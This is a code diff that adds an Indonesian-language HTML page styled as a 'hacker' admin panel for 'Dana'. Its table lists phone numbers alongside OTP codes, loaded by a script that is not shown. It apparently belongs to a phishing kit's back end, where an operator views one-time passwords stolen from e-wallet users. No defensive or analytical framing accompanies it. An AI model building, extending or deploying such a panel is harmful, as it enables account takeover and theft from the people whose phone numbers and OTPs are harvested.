@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dana - Hacker Style</title>
+  <link rel="stylesheet" href="admin-style.css">
+</head>
+<body>
+  <!-- Top Bar: Tombol Kontrol di tengah atas -->
+  <div class="top-bar">
+    <button id="back-button" class="top-button">Kembali ke Index</button>
+    <button id="refresh-button" class="top-button">Refresh Data</button>
+    <button id="play-button" class="top-button">Play Music</button>
+  </div>
+
+  <!-- Audio Player -->
+  <audio id="background-music" loop>
+    <source src="orange (Gustixa ft. Nadine Abigail).mp3" type="audio/mpeg">
+    Browser Anda tidak mendukung elemen audio.
+  </audio>
+
+  <!-- Canvas untuk efek Matrix Rain -->
+  <canvas id="matrixCanvas" class="matrix"></canvas>
+
+  <!-- Container Data -->
+  <div class="container">
+    <h2>Database FLF || Admin Dana</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>No HP</th>
+          <th>OTP</th>
+          <th>Aksi</th>
+        </tr>
+      </thead>
+      <tbody id="userTableBody">
+        <tr><td colspan="3">Memuat data...</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <script src="admin-script.js"></script>
+</body>
+</html>
